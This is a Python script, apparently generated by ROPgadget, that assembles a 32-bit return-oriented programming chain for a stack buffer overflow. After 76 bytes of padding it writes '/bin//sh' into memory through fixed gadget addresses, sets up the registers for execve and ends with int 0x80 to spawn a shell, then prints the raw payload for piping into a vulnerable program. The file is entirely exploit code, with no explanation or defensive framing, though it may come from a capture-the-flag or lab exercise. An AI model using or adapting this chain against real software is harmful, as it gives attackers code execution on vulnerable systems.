#!/usr/bin/env python3
# execve generated by ROPgadget

import sys

from struct import pack

# Padding goes here
p = b'a'*76

p += pack('<I', 0xf7da2479) # pop esi ; ret
p += pack('<I', 0xf7fab060) # @ .data
p += pack('<I', 0xf7db8375) # pop edx ; ret
p += b'/bin'
p += pack('<I', 0xf7e22af6) # mov dword ptr [esi], edx ; pop ebx ; pop esi ; ret

p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding

p += pack('<I', 0xf7da2479) # pop esi ; ret
p += pack('<I', 0xf7fab064) # @ .data + 4
p += pack('<I', 0xf7db8375) # pop edx ; ret
p += b'//sh'
p += pack('<I', 0xf7e22af6) # mov dword ptr [esi], edx ; pop ebx ; pop esi ; ret

p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding

p += pack('<I', 0xf7da2479) # pop esi ; ret
p += pack('<I', 0xf7fab068) # @ .data + 8
p += pack('<I', 0xf7dbeb52) # xor edx, edx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding

p += pack('<I', 0xf7e22af6) # mov dword ptr [esi], edx ; pop ebx ; pop esi ; ret

p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x41414141) # padding

p += pack('<I', 0xf7dad01f) # pop ebx ; ret
p += pack('<I', 0xf7fab060) # @ .data
p += pack('<I', 0xf7db8374) # pop ecx ; pop edx ; ret
p += pack('<I', 0xf7fab068) # @ .data + 8

p += pack('<I', 0x41414141) # padding

p += pack('<I', 0xf7db8375) # pop edx ; ret
p += pack('<I', 0xf7fab068) # @ .data + 8
p += pack('<I', 0xf7db5ec0) # xor eax, eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db07b5) # inc eax ; ret
p += pack('<I', 0xf7db8765) # int 0x80


sys.stdout.buffer.write(p)
